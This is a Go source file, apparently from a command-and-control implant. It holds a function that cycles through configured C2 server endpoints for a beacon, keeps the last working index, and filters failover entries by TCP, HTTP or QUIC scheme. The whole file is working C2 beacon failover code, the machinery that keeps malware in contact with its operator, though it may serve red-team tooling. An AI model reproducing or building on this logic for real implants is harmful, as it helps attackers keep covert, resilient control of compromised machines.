//go:build linux || windows || darwin
// +build linux windows darwin

package main

import "fmt"

// forEachC2Endpoint tries the configured C2 endpoints that belong to transport,
// starting at the last working index and wrapping around, until one returns a
// response. A successful attempt stores the new index so the next beacon starts
// with the endpoint that actually works; a failed sweep leaves the index alone.
//
// The active endpoint is always attempted, even when its scheme does not match
// transport: a single-URL config where the operator set the protocol explicitly
// (or a bare host:port) behaved that way before endpoint failover existed. Other
// entries are only attempted when their scheme is one this transport speaks, so
// a TCP beacon never dials an http:// failover entry with length-prefixed
// framing, and an HTTP beacon never feeds an http:// URL to the QUIC dialer.
//
// The snapshot is stable for the whole sweep, so a concurrent URL-list
// replacement cannot make an attempt close over a stale index.
func forEachC2Endpoint(transport string, attempt func(idx int, raw, hostPort, scheme string) []byte) []byte {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		// No published list (tests, or a config applied before startup parsed
		// it): fall back to the legacy single-endpoint path.
		if hostPort, scheme, ok := currentC2Dial(); ok {
			return attempt(0, currentC2Raw(), hostPort, scheme)
		}
		return nil
	}

	start := int(currentC2Idx.Load()) % len(urls)
	if start < 0 {
		start += len(urls)
	}
	allowed := transportSchemes(transport)
	compatible := func(idx int, scheme string) bool {
		if idx == start {
			return true
		}
		for _, s := range allowed {
			if scheme == s {
				return true
			}
		}
		return false
	}

	attempted := 0
	for i := 0; i < len(urls); i++ {
		idx := (start + i) % len(urls)
		hostPort, scheme, ok := c2DialHostPort(urls[idx])
		if !ok || !compatible(idx, scheme) {
			continue
		}
		attempted++
		if data := attempt(idx, urls[idx], hostPort, scheme); data != nil {
			if idx != start {
				currentC2Idx.Store(int32(idx))
			}
			return data
		}
	}
	if attempted == 0 && Debug {
		fmt.Printf("[!] %s beacon: no compatible endpoint among %d configured C2 URL(s)\n", transport, len(urls))
	}
	return nil
}
